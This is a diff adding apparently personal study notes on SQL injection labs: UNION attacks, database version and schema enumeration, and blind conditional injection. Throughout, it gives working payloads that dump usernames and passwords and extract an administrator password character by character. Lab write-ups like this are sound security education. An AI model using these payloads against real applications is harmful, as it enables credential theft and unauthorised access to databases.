@@ -240,3 +240,83 @@ carlos~montoya
 ### Lab: SQL injection UNION attack, retrieving multiple values in a single column
 
 To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 
+
+For this challenge, the first columns is not of string type, so I could use the payload:
+
+`'+union+select+null,password||'~'||username+from+users--`
+
+![alt text](image-5.png)
+
+## Examining the database in SQL injection attacks
+
+To exploit SQL injection vulnerabilities, it's often necessary to find information about the database. This includes:
+
+ -   The type and version of the database software.
+ -   The tables and columns that the database contains.
+
+ You can potentially identify both the database type and version by injecting provider-specific queries to see if one works
+
+The following are some queries to determine the database version for some popular database types:
+```
+Database type 	Query
+Microsoft, MySQL 	SELECT @@version
+Oracle 	SELECT * FROM v$version
+PostgreSQL 	SELECT version()
+```
+For example, you could use a UNION attack with the following input:
+`' UNION SELECT @@version--`
+
+### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+To solve the lab, display the database version string. 
+
+For this challenge, I use the payload:
+
+`'+union+select+null,@@version#`
+
+### Lab: SQL injection attack, listing the database contents on non-Oracle databases
+
+To solve the lab, log in as the administrator user. 
+
+For this challenge, I use the following payloads:
+
+`'+union+select+null,table_name+from+information_schema.tables--`
+
+`'+union+select+null,column_name+from+information_schema.columns+where+table_name='users_qkxifa'--`
+
+`'+union+select+username_kjdhbe,password_ihczyp+from+users_qkxifa--`
+
+## Blind SQL injection
+Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors. 
+### Exploiting blind SQL injection by triggering conditional responses
+
+Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:
+`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`
+
+When a request containing a TrackingId cookie is processed, the application uses a SQL query to determine whether this is a known user:
+
+`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`
+
+This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data.
+
+This behavior is enough to be able to exploit the blind SQL injection vulnerability. You can retrieve information by triggering different responses conditionally, depending on an injected condition.
+
+For example, suppose there is a table called `Users` with the columns `Username` and `Password`, and a user called `Administrator`. You can determine the password for this user by sending a series of inputs to test the password one character at a time.
+
+To do this, start with the following input:
+
+`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`
+
+This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than m.
+
+Next, we send the following input:
+
+`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't`
+
+This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than t.
+
+Eventually, we send the following input, which returns the "Welcome back" message, thereby confirming that the first character of the password is s:
+
+`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`
+
+We can continue this process to systematically determine the full password for the Administrator user. 
